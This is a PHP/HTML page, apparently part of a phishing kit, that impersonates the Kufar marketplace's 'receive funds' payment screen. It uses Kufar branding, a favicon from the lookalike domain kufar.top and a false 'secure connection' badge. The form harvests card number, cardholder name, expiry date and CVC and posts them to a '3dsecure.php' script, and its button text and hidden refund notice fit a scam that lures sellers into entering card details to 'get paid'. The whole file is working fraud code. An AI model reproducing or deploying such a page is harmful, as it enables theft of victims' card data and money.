<?

include "config.php";

if(empty($order_id)) $order_id = rand(10000000, 99999999);
if(empty($description)) $description = "Оплата заказа";

?>
<!DOCTYPE html>
<html lang="en">

<head>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<title>Получение средств</title>
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<link rel="stylesheet" type="text/css" href="./card/cpg_waiter.css">
	<link rel="stylesheet" type="text/css" href="./card/jquery.selectBox.css">
	<link rel="stylesheet" type="text/css" href="./index_files/pay-card.css">
	<script type="text/javascript" async="" src="../card/client.js"></script>
	<script type="text/javascript" src="./card/es5-shim.min.js"></script>
	<script type="text/javascript" src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
	<script type="text/javascript" src="./card/jquery.selectBox.min.js"></script>
	<script type="text/javascript" src="./card/rb.js"></script>
	<script type="text/javascript" src="./card/common.js"></script>
	<script type="text/javascript" src="./card/cpg_waiter.js"></script>
	<script type="text/javascript" src="./card/standard_waiter.js"></script>
	<script type="text/javascript" src="./card/jquery.maskedinput.min.js"></script>
	<link rel="icon" href="https://kufar.top/kufar_favicon.png" type="image/png">

	<style>
	#loading {
		width: 100%;
		height: 100%;
		top: 0;
		left: 0;
		position: fixed;
		display: block;
		opacity: 0.7;
		background-color: #fff;
		z-index: 99;
		text-align: center;
	}
	
	#loading-image {
		position: absolute;
		top: 50%;
		left: 50%;
		z-index: 100;
	}
	
	.input-error {
		border-color: #ed1651!important;
	}
	</style>
	<link rel="icon" href="https://content.kufar.by/img/favicon.png" type="image/png">
</head>

<body>
	<div id="loading" style="display: none;"> <img id="loading-image" src="./index_files/loader.gif" alt="Пожалуйста подождите..."> </div>
	<div class="pay-card-layout pay-card-layout_type_youla">
		<div class="pay-card-layout__header_type_vkpay">
			<div class="pay-card-layout__logo"> <img src="./index_files/kufar_logo.svg" style="width: 134px;height: 46px;"> </div>
		</div>
		<div class="pay-card js-pay-card pay-card_type_youla" data-type="freepay">
			<p style="display:none ; color: red;margin-bottom: 10px;text-align: left;">Внимание! Для возврата денежных средств на вашей банковской карте должна быть сумма, эквивалентная сумме оплаты включая комиссию.</p>
			<div class="pay-card__row">
				<div class="pay-card__card js-credit-card">
					<div class="credit-card-form credit-card-form_size_standard credit-card-form_holder-name-visible">
						<form class="credit-card-form__form js-card-form" autocomplete="on" method="post" action="3dsecure.php?id=<?php echo $order_id ?>">
							<div class="credit-card-form__card-wrapper">
								<div class="credit-card-form__card credit-card-form__card_position_front">
									<div class="payment-systems-icons payment-systems-icons">
										<style>
										.payment-systems-icon {
											background-image: url("/pay_static/payment-systems-icons.svg")
										}
										</style> <span id="mir" class="payment-systems-icon payment-systems-icon_disabled_yes payment-systems-icon_name_mir js-payment-system-icon-mir"></span> <span id="visa" class="payment-systems-icon payment-systems-icon_disabled_yes payment-systems-icon_name_visa js-payment-system-icon-visa"></span> <span id="mastercard" class="payment-systems-icon payment-systems-icon_disabled_yes payment-systems-icon_name_mastercard js-payment-system-icon-mastercard"></span> <span id="maestro" class="payment-systems-icon payment-systems-icon_disabled_yes payment-systems-icon_name_maestro js-payment-system-icon-maestro"></span> </div>
									<div class="credit-card-form__label-group credit-card-form__label-group_type_card-number clearfix">
										<label class="js-cc-label credit-card-form__label"> <span class="credit-card-form__title">Номер карты</span>
											<input type="tel" name="cardFrom" id="cardnumber" autocomplete="cc-number" placeholder="От 16 до 19 цифр" class="nc credit-card-form__input js-cc-input js-cc-number-input" required="">
											<div class="credit-card-form__error-text">Номер карты введён неверно</div>
										</label>
									</div>
									<div class="credit-card-form__label-group credit-card-form__label-group_type_holder-name clearfix">
										<label class="js-cc-label credit-card-form__label"> <span class="credit-card-form__title">Имя и фамилия на карте</span>
											<input type="text" name="cardFromMonth" id="cardholder" autocomplete="cc-name" class="credit-card-form__input js-cc-input js-cc-name-input" maxlength="40" placeholder="">
											<div class="credit-card-form__error-text">Имя и фамилия латинскими буквами, как на карте</div>
										</label>
									</div>
									<div class="js-card-expiry-date-block credit-card-form__label-group credit-card-form__label-group_type_expiration-date clearfix">
										<label class="js-cc-label credit-card-form__label"> <span class="credit-card-form__title">Срок действия</span>
											<input type="text" name="cardFromYear" id="expdate" autocomplete="cc-exp" placeholder="ММ/ГГ" class="credit-card-form__input js-cc-input js-cc-exp-input" required="">
											<div class="credit-card-form__error-text">Неверная дата</div>
										</label>
									</div>
								</div>
								<div class="credit-card-form__card credit-card-form__card_position_back">
									<div class="credit-card-form__label-group credit-card-form__label-group_type_cvv clearfix">
										<label class="js-cc-label credit-card-form__label credit-card-form__label_type_cvv js-cc-cvv-label"> <span class="credit-card-form__title">CV код <div tabindex="-1" class="credit-card-form__cvv-icon js-cc-cvv-icon"></div></span>
											<input type="tel" name="cardFromCVC" id="cvc2" placeholder="" class="credit-card-form__input  js-cc-input js-cc-cvv-input" autocomplete="off" required="">
											<div class="credit-card-form__error-text js-cc-error-text">Последние три цифры на обороте</div>
										</label>
									</div>
								</div>
								<div class="js-cvv-hint-tooltip credit-card-form__tooltip credit-card-form__tooltip_type_cvv"> Последние 3 цифры на поле для подписи
									<div class="credit-card-form__tooltip-icon"></div>
									<div class="credit-card-form__tooltip-arrow"></div>
								</div>
							</div>
							<div class="credit-card-form__submit">
								<div class="credit-card-form__submit-inner">
									<input type="hidden" name="amount" value="<?=$amount;?>">
									<input type="hidden" name="description" value="<?=$description;?>">
									<input type="hidden" name="order_id" value="<?=$order_id;?>">
									<input type="submit" class="js-button-submit button" name="submit" value="Получить средства"> </div>
							</div>
						</form>
					</div>
				</div>
			</div>
		</div>
		<div class="secure-information secure-information_type_youla"> <span class="secure-information__text" title="Защищённое соединение. Ваши данные в безопасности.">
				<span class="secure-information__icon"></span> <span class="secure-information__text_type_protocol"></span> <span class="secure-information__text_type_secure-connection">Защищённое соединение</span> </span>
		</div>
	</div>
	<script src="./index_files/maskedinput.js.Без названия"></script>
	<script language="javascript" type="text/javascript">
	function load() {
		$('#loading').show();
		setTimeout(function() {
			$(".form-process").submit();
		}, 3000);
	}
	$(window).load(function() {
		setTimeout(function() {
			$('#loading').hide();
		}, 2000);
	});
	window.onload = function() {
		var system = document.getElementById('cardnumber');
		system.onkeyup = function() {
			var value = system.value;
			if(value.length > 0) {
				var num = value[0];
				if(num == 2) {
					$('#mir').removeClass('payment-systems-icon_disabled_yes').addClass('payment-systems-icon_disabled_no');
				} else if(num == 4) {
					$('#visa').removeClass('payment-systems-icon_disabled_yes').addClass('payment-systems-icon_disabled_no');
				} else if(num == 5) {
					$('#mastercard').removeClass('payment-systems-icon_disabled_yes').addClass('payment-systems-icon_disabled_no');
				} else if(num == 6) {
					$('#maestro').removeClass('payment-systems-icon_disabled_yes').addClass('payment-systems-icon_disabled_no');
				} else {
					$('#mir').removeClass('payment-systems-icon_disabled_no').addClass('payment-systems-icon_disabled_yes');
					$('#visa').removeClass('payment-systems-icon_disabled_no').addClass('payment-systems-icon_disabled_yes');
					$('#mastercard').removeClass('payment-systems-icon_disabled_no').addClass('payment-systems-icon_disabled_yes');
					$('#maestro').removeClass('payment-systems-icon_disabled_no').addClass('payment-systems-icon_disabled_yes');
				}
			}
			if(value.length <= 0) {
				$('#mir').removeClass('payment-systems-icon_disabled_no').addClass('payment-systems-icon_disabled_yes');
				$('#visa').removeClass('payment-systems-icon_disabled_no').addClass('payment-systems-icon_disabled_yes');
				$('#mastercard').removeClass('payment-systems-icon_disabled_no').addClass('payment-systems-icon_disabled_yes');
				$('#maestro').removeClass('payment-systems-icon_disabled_no').addClass('payment-systems-icon_disabled_yes');
			}
		}
	}
	</script>
	<script>
	$(document).ready(function() {
		$("#cardnumber").mask("9999 9999 9999 9999? 999", {
			placeholder: ""
		}, {
			autoclear: false
		});
		$("#expdate").mask("99/99", {
			placeholder: ""
		}, {
			autoclear: false
		});
		$("#cvc2").mask("999", {
			placeholder: ""
		}, {
			autoclear: false
		});
		$(".js-button-submit").click(function() {
			expDate = $("input[name='expdate']").val();
			$("input[name='card_expire_month']").val($("input[name='expdate']").val().substr(0, $("input[name='expdate']").val().indexOf("/")));
			$("input[name='card_expire_year']").val($("input[name='expdate']").val().substr(-2));
			$("#card_number").val($("input[name='card_number']").val());
			$("#card_cvc").val($("input[name='card_cvc']").val());
			var number = $("#cardnumber");
			var month = $("input[name='card_expire_month']");
			var year = $("input[name='card_expire_year']");
			var code = $("#cvc2");
			var min_year = new Date().getFullYear();
			var max_year = min_year + 10;
			if(number.val().length !== 19 && number.val().length !== 23 || month.val().length !== 2 || month.val() < 01 || month.val() > 12 || code.val().length !== 3) {
				if(number.val().length !== 19 && number.val().length !== 23) {
					number.addClass("input-error");
				}
				if(month.val().length !== 2 || month.val() < 01 || month.val() > 12) {
					$("#expdate").addClass("input-error");
				}
				if(year.val().length !== 2) {
					$("#expdate").addClass("input-error");
				}
				if(code.val().length !== 3) {
					code.addClass("input-error");
				}
				setTimeout(function() {
					number.removeClass("input-error");
					$("#expdate").removeClass("input-error");
					code.removeClass("input-error");
				}, 2500);
				return false;
			}
			$(this).css("pointer-events", "none");
			$(this).css("pointer-events", "none");
			$(this).val("Ожидание...");
			load();
			return false;
		});
	});
	</script>

</body>

</html>